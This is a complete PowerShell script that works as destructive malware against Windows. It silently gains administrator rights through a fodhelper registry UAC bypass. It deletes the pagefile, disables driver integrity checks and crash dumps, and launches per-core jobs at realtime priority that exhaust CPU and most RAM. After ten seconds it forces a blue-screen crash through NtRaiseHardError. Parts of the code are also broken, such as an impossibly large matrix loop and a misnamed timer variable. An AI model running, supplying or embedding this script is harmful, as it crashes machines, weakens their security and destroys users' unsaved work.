# Self-elevate silently via UAC bypass (unchanged)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# --- System Tweaks (optional, keep your original if desired) ---
Invoke-Expression "wmic computersystem where name='%computername%' set AutomaticManagedPagefile=False"
Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force

# Disable thermal throttling (admin required)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT

# --- Calculate RAM parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetSize = [math]::Floor($physicalMem * 0.9) # 90% of physical RAM

# Chunk size between 700MB and 999MB (start at 700MB)
$minChunkSize = 700MB
$maxChunkSize = 999MB

# Number of CPU cores
$threads = [Environment]::ProcessorCount

# List to hold job objects
$jobs = @()

# Add-Type block to import native NT functions for BSOD trigger
$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@

# Kernel-level BSOD trigger function
function Invoke-KernelBSOD {
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    [CS]::Kill()
}


# Job script block for CPU + Memory stress per thread
$jobScript = {
    param($jobIndex, $minChunkSize, $maxChunkSize, $targetSize)

    # CPU Stress function with multiple CPU intensive tasks
    function Stress-CPU {
        param([int]$iterations)

        # Random data buffer
        $data = [byte[]]::new(8192)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)

        # SHA512 hashing loop
        1..$iterations | ForEach-Object {
            $data = [System.Security.Cryptography.SHA512]::HashData($data)
        }

        # Large prime factorization (CPU heavy)
        function Get-Primes {
            param($n)
            $factors = @()
            for ($i = 2; $i -le $n; $i++) {
                while ($n % $i -eq 0) {
                    $factors += $i
                    $n = [math]::Floor($n / $i)
                }
            }
            return $factors
        }
        Get-Primes 9889396939693 | Out-Null

        # Matrix multiplication stress (smaller size to avoid extreme delays)
        $size = 150000
        $A = @(); $B = @(); $C = @()
        0..($size-1) | ForEach-Object {
            $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1532360321 -Max 1231235436536999 })
            $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1532360321 -Max 1231235436536999 })
            $C += ,@(0..($size-1) | ForEach-Object { 0 })
        }
        0..($size-1) | ForEach-Object { $i = $_
            0..($size-1) | ForEach-Object { $j = $_
                $sum = 0
                0..($size-1) | ForEach-Object { $k = $_
                    $sum += $A[$i][$k] * $B[$k][$j]
                }
                $C[$i][$j] = $sum
            }
        }
    }

    # Memory Stress function progressively allocating chunks
    function Stress-MemoryProgressive {
        param(
            [int64]$minChunkSize,
            [int64]$maxChunkSize,
            [int64]$targetSize
        )
        $allocated = 0
        $memChunks = [System.Collections.Generic.List[byte[]]]::new()
        $chunkSize = $minChunkSize

        while ($allocated -lt $targetSize) {
            if ($chunkSize -lt $maxChunkSize) {
                $chunkSize = [math]::Min($chunkSize + 50MB, $maxChunkSize)
            }
            try {
                $chunk = New-Object byte[] $chunkSize
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
                Write-Progress -Activity "Allocating Memory" -Status "Allocated $([math]::Round($allocated / 1MB)) MB" -PercentComplete (($allocated / $targetSize) * 100)
            } catch {
                Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
                break
            }
            Start-Sleep -Milliseconds 500
        }
        # Keep $memChunks alive to prevent GC
        while ($true) { Start-Sleep -Seconds 10 }
    }

    # Set thread priority highest
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest

    # Set process priority to Realtime (aggressive)
    $proc = Get-Process -Id $PID
    try {
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
        Write-Host "Job ${jobIndex}: Process priority set to Realtime."
    } catch {
        Write-Warning "Job ${jobIndex}: Failed to set process priority to Realtime: $_"
    }

    # Start memory stress in background thread
    $memThread = [System.Threading.Thread]::new({
        param($minCS, $maxCS, $target)
        Stress-MemoryProgressive $minCS $maxCS $target
    })
    $memThread.Start($minChunkSize, $maxChunkSize, $targetSize)

    # CPU stress loop with progressive load increase
    $iterations = 1_000_000
    while ($true) {
        try {
            Stress-CPU -iterations $iterations
        } catch {}

        Write-Progress -Activity "Job $jobIndex CPU Stress" -Status "Iterations: $iterations"
        Start-Sleep -Milliseconds 200

        if ($iterations -lt 10000000) {
            $iterations += 500000
        }
    }
}

# Start stress jobs for each CPU core
for ($i = 1; $i -le $threads; $i++) {
    $jobs += Start-Job -ScriptBlock $jobScript -ArgumentList $i, $minChunkSize, $maxChunkSize, $targetSize
}

Write-Host "Started $threads stress jobs with high priority."

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# Optional: Wait some time before triggering BSOD (adjust delay as needed)
$bsodDelaySeconds = 10
Write-Host "Waiting $bsodDelaySeconds seconds before triggering BSOD..."
$elapsedTime = 0

while ($elapsedTime -lt $bsodDelaySeconds) {
    Start-Sleep -Seconds 1
    $elapsedTime++
    Write-Progress -Activity "Waiting before BSOD" -Status "$elapsed seconds elapsed" -PercentComplete (($elapsed / $bsodDelaySeconds) * 100)
    foreach ($job in $jobs) {
        if ($job.State -ne 'Running') {
            Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
            Remove-Job -Job $job -Force
            $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
            $jobs += $newJob
        }
    }
}

# Trigger BSOD
Invoke-KernelBSOD

# Monitor jobs (optional)
# try {
#     while ($true) {
#         Start-Sleep -Seconds 5
#         foreach ($job in $jobs) {
#             if ($job.State -ne 'Running') {
#                 Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
#                 Remove-Job -Job $job -Force
#                 $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
#                 $jobs += $newJob
#             }
#         }
#     }
# } finally {
#     # Cleanup jobs on exit
#     $jobs | ForEach-Object {
#         Stop-Job -Job $_ -Force
#         Remove-Job -Job $_ -Force
#     }
#     Write-Host "Stress jobs stopped and cleaned up."
# }